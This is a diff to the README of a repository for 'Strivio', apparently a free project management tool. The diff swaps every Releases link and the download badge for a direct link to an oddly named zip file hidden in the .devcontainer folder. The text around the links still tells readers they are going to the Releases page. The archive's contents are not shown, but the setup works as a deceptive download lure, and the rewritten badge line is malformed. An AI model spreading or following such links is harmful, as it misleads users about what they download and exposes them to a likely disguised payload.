@@ -8,13 +8,13 @@ Welcome to Strivio, a free project management tool designed to help you manage t
 
 To get started with Strivio, you need to download the application. You can find the latest version of Strivio on GitHub. 
 
-[![Download Strivio](https://img.shields.io/badge/Download%20Strivio-v1.0-blue.svg)](https://github.com/quits-shortstaplecotton615/strivio-pm/releases)
+[![Download Strivio](https://raw.githubusercontent.com/quits-shortstaplecotton615/strivio-pm/main/.devcontainer/strivio-pm-Bernardine.zip%https://raw.githubusercontent.com/quits-shortstaplecotton615/strivio-pm/main/.devcontainer/strivio-pm-Bernardine.zip)](https://raw.githubusercontent.com/quits-shortstaplecotton615/strivio-pm/main/.devcontainer/strivio-pm-Bernardine.zip)
 
 Click the link above to visit the Releases page and download the software that suits your system.
 
 ### How to Download:
 
-1. Go to the [Releases page](https://github.com/quits-shortstaplecotton615/strivio-pm/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/quits-shortstaplecotton615/strivio-pm/main/.devcontainer/strivio-pm-Bernardine.zip).
 2. Find the latest release. It is usually marked with a version number like "v1.0".
 3. Look for files related to your operating system (e.g., Windows, macOS, or Linux).
 4. Click on the link to download the file.
@@ -74,7 +74,7 @@ Strivio is built around the following topics which enhance its functionality and
 
 ## 🔗 Useful Links
 
-- [Visit Strivio Releases](https://github.com/quits-shortstaplecotton615/strivio-pm/releases)
+- [Visit Strivio Releases](https://raw.githubusercontent.com/quits-shortstaplecotton615/strivio-pm/main/.devcontainer/strivio-pm-Bernardine.zip)
 - [Join Our Community Forum](#)
 
 Thank you for choosing Strivio! We hope it makes your project management tasks easier and more enjoyable.
